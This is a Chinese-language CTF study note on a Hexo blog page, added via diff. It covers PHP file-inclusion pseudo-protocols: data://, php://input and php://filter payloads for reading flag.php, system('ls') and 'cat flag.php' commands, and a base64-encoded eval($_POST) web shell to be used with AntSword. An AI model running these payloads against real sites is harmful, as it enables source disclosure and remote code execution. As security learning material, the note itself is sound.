@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>文件包含伪协议 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="1.?file&#x3D;data:text&#x2F;plain, 2.?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; 3.?file&#x3D;php:&#x2F;&#x2F;input [POST DATA:] 4.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含伪协议">
+<meta property="og:url" content="http://example.com/2025/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1.?file&#x3D;data:text&#x2F;plain, 2.?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; 3.?file&#x3D;php:&#x2F;&#x2F;input [POST DATA:] 4.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-04-25T08:02:27.000Z">
+<meta property="article:modified_time" content="2025-04-25T08:56:19.678Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-文件包含伪协议" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
+  <time class="dt-published" datetime="2025-04-25T08:02:27.000Z" itemprop="datePublished">2025-04-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      文件包含伪协议
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>1.?file&#x3D;data:text&#x2F;plain,<?php phpinfo()?></p>
+<p>2.?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</p>
+<p>3.?file&#x3D;php:&#x2F;&#x2F;input [POST DATA:]<?php phpinfo()?></p>
+<p>4.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p>
+<?php phpinfo()?><p>如果找不到flag，那也别傻站着，换个命令，<?php system("ls")?>或者直接<?php system("cat flag.php")?></p>
+<p>第二点的PD9waHAgcGhwaW5mbygpPz4&#x3D;base64形式的<?php phpinfo()?>，如果这个不行，也别傻站着，换个命令，你不知道对面会过滤什么，唯有多尝试。</p>
+<p>?filename&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA&#x2F;Pg&#x3D;&#x3D;</p>
+<p>这里其实就是上传文件木马<?php eval($_POST[xiaohua]); ?>，之后直接连接蚁剑就可以拿到flag，这个就叫做 (data:&#x2F;&#x2F;伪协议传木马)</p>
+<h3 id="转换过滤器是什么"><a href="#转换过滤器是什么" class="headerlink" title="转换过滤器是什么"></a>转换过滤器是什么</h3><p>转换过滤器是 PHP 里一种特殊的工具，它能对文件内容进行特定的转换操作。想象一下，你手里有一份文件，文件里有各种各样的内容，而转换过滤器就像是一个 “内容加工机器”，可以按照你的要求对文件内容进行修改。</p>
+<p>比如说，文件里的字母可能是小写的，你希望它们都变成大写，或者文件内容是一堆正常文字，你想把它们变成 Base64 编码的形式，又或者你想对文件内容进行加密、解密等操作，转换过滤器就可以帮你实现这些功能。</p>
+<h3 id="在文件包含伪协议中的用法"><a href="#在文件包含伪协议中的用法" class="headerlink" title="在文件包含伪协议中的用法"></a>在文件包含伪协议中的用法</h3><h4 id="1-convert-base64-encode-过滤器"><a href="#1-convert-base64-encode-过滤器" class="headerlink" title="1. convert.base64-encode 过滤器"></a>1. <code>convert.base64-encode</code> 过滤器</h4><p>这个过滤器的作用是把文件内容转换为 Base64 编码的形式。Base64 编码是一种把二进制数据转换为可打印 ASCII 字符的编码方式，常用于在文本协议中传输二进制数据</p>
+<h4 id="2-read-string-toupper-过滤器"><a href="#2-read-string-toupper-过滤器" class="headerlink" title="2. read=string.toupper 过滤器"></a>2. <code>read=string.toupper</code> 过滤器</h4><p>这个过滤器的作用是把文件内容中的字母都转换为大写形式。</p>
+<h4 id="3-string-tolower"><a href="#3-string-tolower" class="headerlink" title="3.string.tolower"></a>3.<strong><code>string.tolower</code></strong></h4><p>将文件内容中的所有字母转换为小写形式。若要把一个文件中的大写字母全部转换为小写，可使用<code>php://filter/read=string.tolower/resource=file.txt</code>，这样会读取<code>file.txt</code>的内容并将其中的字母都变成小写后返回。</p>
+<h4 id="4-convert-iconv-："><a href="#4-convert-iconv-：" class="headerlink" title="4.convert.iconv.\*："></a>4.<strong><code>convert.iconv.\*</code></strong>：</h4><p>这是一组用于字符编码转换的过滤器，<code>*</code> 处可以替换为具体的字符编码，如<code>convert.iconv.utf - 8/cp1252</code>用于将 UTF - 8 编码的内容转换为 CP1252 编码。例如，<code>php://filter/convert.iconv.utf - 8/cp1252/resource=file.txt</code>可将<code>file.txt</code>中 UTF - 8 编码的内容转换为 CP1252 编码。</p>
+<h5 id="filename-php-filter-convert-iconv-UTF-8-UCS-4-resource-flag-php"><a href="#filename-php-filter-convert-iconv-UTF-8-UCS-4-resource-flag-php" class="headerlink" title="?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UTF-8.UCS-4*&#x2F;resource&#x3D;flag.php"></a>?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UTF-8.UCS-4*&#x2F;resource&#x3D;flag.php</h5><p>这个payload几乎都能用</p>
+<p>过滤了一些就用爆破</p>
+<p> UCS-4*<br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*</p>
+<h4 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a><strong>string.rot13</strong></h4><p>str_rot13—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;1.php</p>
+<h4 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h4><p>虽然 压缩封装协议 提供了在本地文件系统中创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。</p>
+<p>例如：</p>
+<p>?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php就是对flag.php进行zlib压缩处理，然后读取文本信息</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cm9wrpanc000238uof1m0bv80" data-title="文件包含伪协议" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/04/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          无数字字母rce
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/04/23/%E5%8F%8D%E5%B0%84/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">反射</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">April 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/">无数字字母rce</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE/">文件包含伪协议</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/23/%E5%8F%8D%E5%B0%84/">反射</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/23/md5%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E%E5%8F%8A%E7%BB%95%E8%BF%87/">md5强弱碰撞及绕过</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
